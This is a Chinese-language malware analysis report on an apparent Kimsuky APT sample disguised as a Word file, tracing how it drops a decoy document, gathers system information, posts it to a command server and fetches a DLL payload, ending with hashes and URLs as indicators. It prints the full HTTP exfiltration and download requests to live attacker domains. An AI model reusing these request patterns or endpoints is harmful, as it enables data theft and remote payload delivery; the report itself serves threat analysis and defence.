## **概述：**

KimsukyAPT是一个长期活跃的APT攻击组织，一直针对于韩国的智囊团,政府组织,新闻组织,大学教授等等进行活动.并且该组织拥有多平台的攻击能力,载荷便捷,阶段繁多。

在日常的样本追踪过程中发现了此最新样本

##  **样本信息一：**

Md5 ：adc39a303e9f77185758587875097bb6

该样本为伪装为word文件图标的pe文件

![1599186713.png!small](https://image.3001.net/images/20200904/1599186713.png!small)

##  **样本分析：**

进入主函数后读取资源“JUYFON”

![1599186739.png!small](https://image.3001.net/images/20200904/1599186739.png!small)

查看文件资源“JUYFON”应该为一段加密后的数据

![1599187139.png!small](https://image.3001.net/images/20200904/1599187139.png!small)

读取该资源段后通过简单的解密获取内容：

![1599188065.png!small](https://image.3001.net/images/20200904/1599188065.png!small)

后创建文件并解密后的内容写入新创建的文件：

![1599188073.png!small](https://image.3001.net/images/20200904/1599188073.png!small)

通过调试获取创建的文件名：

![1599188082.png!small](https://image.3001.net/images/20200904/1599188082.png!small)

![1599188088.png!small](https://image.3001.net/images/20200904/1599188088.png!small)

创建文件后打开该文件，为一个伪装的doc文件，起到迷惑受害者的作用：

![1599188097.png!small](https://image.3001.net/images/20200904/1599188097.png!small)

经过翻译后为跟韩国某学校相关的文档：

![1599188105.png!small](https://image.3001.net/images/20200904/1599188105.png!small)

随后启动一个线程：

![1599188112.png!small](https://image.3001.net/images/20200904/1599188112.png!small)

该线程中主要包含3个函数404250，4049e0，4045c0

![1599188118.png!small](https://image.3001.net/images/20200904/1599188118.png!small)

404250-----》

![1599188127.png!small](https://image.3001.net/images/20200904/1599188127.png!small)

生成临时目录文件wcl.doc：

![1599188138.png!small](https://image.3001.net/images/20200904/1599188138.png!small)

生成临时文件名tcf.bin以备后续使用

![1599188145.png!small](https://image.3001.net/images/20200904/1599188145.png!small)

通过cmd命令将窃取的本地计算机信息写入wcl.doc:

![1599188151.png!small](https://image.3001.net/images/20200904/1599188151.png!small)

![1599188161.png!small](https://image.3001.net/images/20200904/1599188161.png!small)

Wcl.doc完成生成后格式如下，主要包含系统临时文件，系统信息等：

![1599188168.png!small](https://image.3001.net/images/20200904/1599188168.png!small)

4049e0------》

此函数主要功能是读取上一步生成的本地计算机信息，并发送给远控端

![1599188192.png!small](https://image.3001.net/images/20200904/1599188192.png!small)

此处包含一些迷惑调试器的代码，如图4bca处：

![1599188199.png!small](https://image.3001.net/images/20200904/1599188199.png!small)

但在IDA中可以正常识别：

![1599188205.png!small](https://image.3001.net/images/20200904/1599188205.png!small)

由于eax=0，nop word ptr「eax」操作无意义，因此在OD中选择delete analysis后继续单步调试即可：

![1599188211.png!small](https://image.3001.net/images/20200904/1599188211.png!small)

构造好的post body内容如下，包括分割符及加密后的前面窃取的计算机信息文件

![1599188220.png!small](https://image.3001.net/images/20200904/1599188220.png!small)

其中404dd0主要功能是通过http协议将窃取的计算机信息发送到pingguo2.atwbpage.com

![1599188233.png!small](https://image.3001.net/images/20200904/1599188233.png!small)

![1599188254.png!small](https://image.3001.net/images/20200904/1599188254.png!small)

完整的post请求如下：

    
    
    POST /home/jpg/post.php HTTP/1.1 Accept: */* Host: pingguo2.atwebpages.com Referer: http://pingguo2.atwebpages.comhome/jpg/post.php Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywhpFxMBe19cSjFnG Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322) Content-Length: 5571 Connection: Keep-Alive Cache-Control: no-cache
    
    pingguo2.atwebpages.com/home/jpg/post.php

4045c0-----》

首先构造get请求，从服务器上读取文件：

完成的请求如下：

![1599188386.png!small](https://image.3001.net/images/20200904/1599188386.png!small)

    
    
    GET /home/jpg/download.php?filename=button01 HTTP/1.1 Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 Host: pingguo2.atwebpages.com Cache-Control: no-cache
    
    pingguo2.atwebpages.com/home/jpg/download.php?filename=button01

经过测试，发现该请求无法获取相应：

![1599188398.png!small](https://image.3001.net/images/20200904/1599188398.png!small)

分析代码后发现会将从服务器上读取的文件写入之前创建的临时文件tcf.bin，并将起用loadlibrary加载，因此可以判断tcf.bin应该是一个有更复杂功能的dll木马文件，且load该dll并没有去call
其他导出函数，猜测该dll的恶意代码都在dllmain里面

![1599188408.png!small](https://image.3001.net/images/20200904/1599188408.png!small)

![1599188415.png!small](https://image.3001.net/images/20200904/1599188415.png!small)

同时可以关联到另外一个样本

样本信息：

Md5 28833e121bb77c8262996af1f2aeef55

此样本上传时间稍早，代码结构完成一致，粗略分析仅两处与上一个样本不同：

1.生产的迷惑文件文字不同：

![1599188422.png!small](https://image.3001.net/images/20200904/1599188422.png!small)

2：c2服务器的域名及url不同：

![1599188429.png!small](https://image.3001.net/images/20200904/1599188429.png!small)

##  **关联分析：**

由于2个样本种都使用了相同的字符串作为post的分隔符：WebKitFormBoundarywhpFxMBe19cSjFnG.通过搜索引擎检索，会得到如下的结果：

![1599188439.png!small](https://image.3001.net/images/20200904/1599188439.png!small)

可以看到这段字符串在很久以前就出现并且曾被用于针对韩国冬奥会的攻击,并且Kimsuky攻击活动中曾经使用过，同时结合样本的掩护文档的内容，可以确定被攻击者目标是韩国大学相关人士，完全符合以往Kimsuky的攻击意图，因此可以断定此样本的来源大概率是Kimsuky。

 **IOC** **：**

MD5:  
  
---  
  
adc39a303e9f77185758587875097bb6  
  
28833e121bb77c8262996af1f2aeef55  
  
URL：  
  
portable.epizy.com/img/png/post.php  
  
portable.epizy.com/img/png/download.php?filename=images01  
  
pingguo2.atwebpages.com/home/jpg/download.php?filename=button01

